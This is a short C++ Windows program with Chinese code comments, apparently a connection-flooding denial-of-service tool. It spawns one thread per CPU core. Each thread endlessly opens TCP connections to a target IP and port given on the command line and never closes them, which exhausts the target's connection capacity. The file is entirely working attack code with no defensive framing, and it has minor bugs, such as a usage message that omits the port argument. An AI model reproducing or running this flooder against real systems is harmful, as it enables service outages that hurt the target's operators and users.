/*     
 
 g++ -ocnt.exe cnt.cpp -Wl,-Bstatic -lwsock32  -liphlpapi -lpthreadgc2 -Wl,-Bdynamic -lwpcap
  
       
 */  

#include "adr.h"
#include <stdio.h>
#include <winsock2.H>   
#include <iphlpapi.h>
#define HAVE_REMOTE  
#include <pthread.h>              
#define MSGSIZE        1024         //收发缓冲区的大小    
using namespace std;

struct thread_param {
	char*		pcDstIP;
	int*		pnDstPort;
};



static bool 			FLOODING=true;
static pthread_t*  		P_THREAD_LIST; 

int fnGetCPUNum(){

	SYSTEM_INFO si;  
  
  GetSystemInfo(&si);  
  
  return si.dwNumberOfProcessors;
}


void *fnCreateCNT(void * arg){


	struct thread_param *pThreadParam;
	pThreadParam = (struct thread_param *) arg;
   	
	char* 			pcDstIP		=pThreadParam->pcDstIP;
	int* 			pnDstPort	=pThreadParam->pnDstPort;
	



	WSADATA wsaData;      
  //连接所用套节字      
  SOCKET sClient;      
  //保存远程服务器的地址信息      
  SOCKADDR_IN server;      
    

  printf("iMaxSockets:%d\n", wsaData.iMaxSockets);
                   
  // Initialize Windows socket library      
  WSAStartup(0x0202, &wsaData);      
                   
       
  // 指明远程服务器的地址信息(端口号、IP地址等)      
  memset(&server, 0, sizeof(SOCKADDR_IN)); //先将保存地址的server置为全0      
  server.sin_family = PF_INET; //声明地址格式是TCP/IP地址格式      
  server.sin_port = htons(*pnDstPort); //指明连接服务器的端口号，htons()用于 converts values between the host and network byte order      
  server.sin_addr.s_addr = inet_addr(pcDstIP); //指明连接服务器的IP地址      
                                                        //结构SOCKADDR_IN的sin_addr字段用于保存IP地址，sin_addr字段也是一个结构体，sin_addr.s_addr用于最终保存IP地址      
                                                        //inet_addr()用于将 形如的"127.0.0.1"字符串转换为IP地址格式   

  while(true){      
     	// 创建客户端套节字      
   	sClient = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); //AF_INET指明使用TCP/IP协议族；      
                                                         //SOCK_STREAM, IPPROTO_TCP具体指明使用TCP协议                                                  
   	//连到刚才指明的服务器上      
    int c=connect(sClient, (struct sockaddr *) &server, sizeof(SOCKADDR_IN)); //连接后可以用sClient来使用这个连接     
    if(c!=0)
      printf("connect:%d\n", c);

  }                                                           //server保存了远程服务器的地址信息      



    


	
}


int fnCreateCNT(char* pcDstIp,int nPort){


	
 	//fnCreateCNTExec((void*)cpDstIp);
 

 	struct thread_param threadParam;
	
	threadParam.pcDstIP=pcDstIp;
	threadParam.pnDstPort=&nPort;


	 
	int nCPUNum=fnGetCPUNum();
	P_THREAD_LIST=new pthread_t[nCPUNum];

	int rc;
	for(int i=0; i < nCPUNum; i++ ){
		rc = pthread_create(&P_THREAD_LIST[i], NULL,fnCreateCNT, (void*)&threadParam);
		printf("Create thread succeed :%d\n",i );
      	if (rc){
         	printf("Error:unable to create thread :%d\n",i );
         	exit(-1);
      	}
	}
	
	
	
	for(int i=0; i < nCPUNum; i++ ){
		pthread_join(P_THREAD_LIST[i],NULL);
	}

	return 0;
}


                   
int main(int argc, char* argv[])
{      
   

	printf("***********************************************************\n");
	printf("Use:\n");
  printf("cnt target_ip\n");
  printf("***********************************************************\n");
  fflush(stdout);


  char ip[32];
  fnHostToIP(argv[1],ip);
  printf("ip:%s\n", ip);
  fnCreateCNT(ip,atoi(argv[2]));
   
}  